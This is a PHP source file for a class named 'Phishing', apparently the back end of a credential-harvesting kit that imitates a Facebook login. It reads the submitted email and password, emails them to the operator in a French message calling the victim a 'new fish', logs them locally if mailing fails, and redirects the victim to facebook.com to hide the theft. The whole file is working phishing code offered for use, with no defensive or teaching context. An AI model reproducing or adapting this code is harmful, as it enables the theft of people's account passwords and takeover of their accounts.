<?php

namespace Informagenie;

use Katzgrau\KLogger\Logger;

class Phishing
{
    /**
    * Instance of SimpleMail
    *
    * @type \SimpleMail
    */
    protected $mailler;

    protected $datas;    

    public function __construct()
    {
        $this->mailler = new \SimpleMail();
        $this->datas = array_map('htmlspecialchars', $_POST);
    }
    
    /**
    * Send credentials via email
    *
    * @param Array $data
    **/	
    protected function mail(Array $data)
    {
        return  $this->mailler->setFrom('Mbungu ngoma', 'goms@labes-ley.com')
                ->setTo($data['my_email'], $data['my_name'])
                ->setSubject($data['subject'])
                ->setMessage($this->buildContent())
                ->setHtml()
                ->send();
    }
	
    /**
    * Send credential
    *
    * @param Array $data
    */
    public function send(Array $data)
    {
	if($this->mail($data))
	{
	    header('Location: https://facebook.com');
	    exit();
	}else{
	    $this->log($this->buildContent());
	}
    }
    
    /**
    * Save log credentials
    *
    * @param String $content
    */
    protected function log($content)
    {
	$logger = new Logger(__DIR__.'/logs');
	$logger->info(strip_tags($content));
    }
    
    /**
    * Genere credential text to send
    *
    * @return String
    **/
    protected function buildContent()
    {
        $username = !empty($this->datas['email']) ? $this->datas['email'] : 'Inconnue';
        $password = !empty($this->datas['pass']) ? $this->datas['pass'] : 'Inconnue';
        return $content = <<<content
<p>Bonjour, <br />
Vous avez un nouveau poisson !<p>

<ul>
<li>Nom  d'utilisateur : $username </li>

<li>Mot de passe : $password </li>
</ul>
content;
    }

}
